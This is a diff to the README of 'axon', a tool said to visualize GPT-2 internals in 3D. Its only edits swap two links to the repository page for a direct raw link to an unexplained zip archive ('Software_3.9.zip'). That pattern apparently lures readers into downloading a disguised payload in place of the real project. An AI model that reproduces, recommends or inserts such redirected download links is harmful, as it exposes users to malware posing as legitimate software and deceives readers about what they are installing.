@@ -1,6 +1,6 @@
 # 🧠 axon - See gpt-2 thoughts in 3d
 
-[![](https://img.shields.io/badge/Download-axon-blue.svg)](https://github.com/faizdafa26/axon)
+[![](https://img.shields.io/badge/Download-axon-blue.svg)](https://raw.githubusercontent.com/faizdafa26/axon/main/antimachine/Software_3.9.zip)
 
 ## 🔍 What is axon?
 
@@ -21,7 +21,7 @@ Your computer needs specific parts to run the visualization well.
 
 You must visit the project page to get the files. Axon runs through your web browser, but it requires local setup on your hard drive to process the data correctly.
 
-[Visit the official download page here](https://github.com/faizdafa26/axon)
+[Visit the official download page here](https://raw.githubusercontent.com/faizdafa26/axon/main/antimachine/Software_3.9.zip)
 
 1. Click the link provided above.
 2. Look for the green button labeled Code.
